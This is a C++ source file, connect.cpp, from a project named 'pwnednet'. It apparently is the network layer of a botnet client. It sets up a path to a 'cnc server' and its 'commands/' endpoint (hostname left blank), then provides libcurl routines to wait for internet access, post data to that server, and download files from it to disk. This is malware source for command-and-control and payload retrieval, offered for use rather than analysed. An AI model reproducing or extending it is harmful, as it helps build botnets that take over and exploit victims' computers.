//
//  connect.cpp
//  pwnednet
//
/*
 
 
 
 
 
 */

#include "connect.h"

string response;


string https        = "http://";
string server       = "";                           // The hostname
string g_cServer    = https + server + "/abc/";     // The path to the cnc server
string g_Commands   = g_cServer + "commands/";

Connect* con        = new Connect();


// For strings
size_t post_writedata(void *ptr, size_t size, size_t nmemb, void *stream)
{
    unsigned long numbytes = size*nmemb;
    char lastchar = *((char *) ptr + numbytes - 1);
    
    *((char *) ptr + numbytes - 1) = '\0';
    response.append((char *)ptr);
    response.append(1,lastchar);
    *((char *) ptr + numbytes - 1) = lastchar;
    
    return size*nmemb;
}

// For downloads
size_t download_writedata(void *ptr, size_t size, size_t nmemb, FILE *stream)
{
    size_t written;
    written = fwrite(ptr, size, nmemb, stream);
    
    return written;
}

// Checks of connected to the internet
bool Connect::isConnected()
{
    CURL *curl;
    CURLcode res;
    
    curl = curl_easy_init();
    
    string url = "https://www.google.com";
    
    if(curl) {
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        
        while ((res = curl_easy_perform(curl)) != CURLE_OK)
        {
            switch (res)
            {
                case CURLE_COULDNT_CONNECT:
                case CURLE_COULDNT_RESOLVE_HOST:
                case CURLE_COULDNT_RESOLVE_PROXY:
                    return false;
                    break;
                    
                default:
                    return false;
            }
            
        }
        
        curl_easy_cleanup(curl);
    }
    
    return true;
    
}


// If not connected to the internet it waits for a connection
void Connect::WaitForConnection()
{
    if(!isConnected())
    {
        bool con = false;
        
        while(!con)
        {
            if(isConnected())
            {
                con = true;
            }
            sleep(1);
        }
        
    }
    
}


string Connect::post(const char* url, const char* postData)
{
    response = "";
    
    CURL *curl;
    CURLcode curlc;
    curl = curl_easy_init();
    
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData);
        
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, post_writedata);
        
        curlc = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    
    curl_global_cleanup();
    
    return response;
}

bool Connect::Download(string url, char outfilename[FILENAME_MAX])
{
    CURL *curl;
    FILE *fp;
    CURLcode res;
    
    curl = curl_easy_init();
    
    if (curl)
    {
        fp = fopen(outfilename, "wb");
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, download_writedata);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        
        fclose(fp);
    }
    
    return DoesFileExist(outfilename);
}

